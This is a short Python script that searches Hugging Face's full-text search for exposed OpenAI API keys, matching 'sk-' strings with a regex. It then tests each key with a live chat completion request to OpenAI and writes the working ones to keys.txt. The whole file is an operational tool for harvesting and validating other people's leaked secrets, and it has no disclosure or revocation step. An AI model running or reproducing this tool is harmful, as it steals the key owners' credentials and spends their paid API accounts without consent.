import aiohttp
import aiofiles
import re
import asyncio

OUTPUT_FILE = "keys.txt"

keys = set()
valid_keys = set()
chars = [chr(i) for i in range(97, 123)] + [chr(i) for i in range(65, 91)] + [str(i) for i in range(10)]

async def get_keys(session: aiohttp.ClientSession, char: str, i: int):
    pattern = r'(sk-\w)<\/span>([a-zA-Z0-9]{47})'
    url = f"https://huggingface.co/search/full-text?q=sk-{char}&limit=100&skip={i}"

    try:
        async with session.get(url) as response:
            response.raise_for_status()
            output = await response.text()

            key_list = re.findall(pattern, output)

            if key_list:
                for key in key_list:
                    if (key[0] + key[1]) not in keys:
                        print(f"Found key: {key[0] + key[1]}")
                    keys.add(key[0] + key[1])
    except aiohttp.ClientResponseError as e:
        print("Error: ", e)

async def validate_key(session: aiohttp.ClientSession, key: str):
    try:
        payload = {"model": "gpt-4-turbo-2024-04-09", "messages": [{"role": "user", "content": "Hello!"}]}
        async with session.post("https://api.openai.com/v1/chat/completions", headers={"Authorization": f"Bearer {key}"}, json=payload) as r:
            r.raise_for_status()
            valid_keys.add(key)
            print(f"Valid key: {key}")
            async with aiofiles.open(OUTPUT_FILE, mode="w") as f:
                await f.write("\n".join(valid_keys))
    except aiohttp.ClientResponseError as e:
        print(f"Invalid key: {key} - {e}")

async def main():
    async with aiohttp.ClientSession() as session:  
        await asyncio.gather(*(get_keys(session, char, i) for i in range(0, 19, 10) for char in chars))
        await asyncio.gather(*(validate_key(session, key) for key in keys))

if __name__ == "__main__":
    asyncio.run(main())
